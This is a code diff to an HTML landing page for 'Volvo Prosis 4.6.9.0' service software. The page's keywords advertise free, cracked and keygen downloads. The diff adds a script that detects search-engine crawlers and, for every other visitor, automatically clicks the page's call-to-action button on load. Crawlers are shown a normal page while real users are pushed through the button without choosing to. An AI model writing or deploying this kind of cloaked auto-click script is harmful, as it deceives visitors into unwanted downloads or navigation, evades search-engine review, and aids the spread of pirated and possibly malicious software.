@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Volvo Prosis 4.6.9.0 06.2024 Offline Service Information</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Get the latest Volvo Prosis 4.6.9.0 06.2024 offline service information for all regions. Covers spare parts, wiring diagrams, and service bulletins.">
     <meta name="keywords" content="Volvo Prosis 4.6.9.0 06.2024, Volvo Prosis 4.6.9.0, Volvo Prosis 2024, Volvo Service Information, Volvo Spare Parts Catalog, Volvo Wiring Diagram, Volvo Service Bulletin, Volvo Equipment Maintenance, Volvo Equipment Specifications, Volvo Offline Service Info, Volvo Prosis Update 2024, Volvo Prosis Wiring Diagram, Volvo Service Manual, Volvo Maintenance Guide, Volvo Prosis Spare Parts, Volvo Equipment Service, volvo prosis 2024, volvo parts catalog, volvo service information, volvo wiring diagrams, volvo service bulletins, volvo equipment specifications, volvo maintenance manual, heavy equipment software, volvo offline database, volvo technical information, construction equipment parts, volvo articulated haulers, volvo asphalt compactors, volvo backhoe loaders, volvo compact excavators, volvo wheel loaders, volvo motor graders, volvo pipelayers, volvo rigid haulers, volvo skid steer loaders, volvo soil compactors, volvo paving equipment, volvo feller bunchers, volvo road wideners, volvo screeds, volvo milling equipment, heavy machinery repair, volvo parts lookup, construction equipment maintenance, volvo diagnostic software, volvo repair manual, volvo parts search, heavy equipment diagrams, volvo technical data, construction vehicle specifications, volvo equipment troubleshooting, volvo parts numbers, heavy machinery service, volvo component diagrams, construction equipment repair, volvo maintenance schedules, heavy equipment parts catalog, volvo service procedures, construction vehicle wiring, volvo equipment diagnostics, heavy machinery maintenance, volvo technical support, construction equipment software, Volvo Prosis 4.6.9.0 download, Volvo Prosis 4.6.9.0 free download, Volvo Prosis 4.6.9.0 high speed download, Volvo Prosis diagnostic software, Volvo Prosis diagnostic software download, Volvo Prosis diagnostic software free download, Volvo Prosis diagnostic software crack, Volvo Prosis diagnostic software keygen, Volvo Prosis 4.6.9.0 06.2024 download, Volvo Prosis 4.6.9.0 06.2024 free download">
     <style>
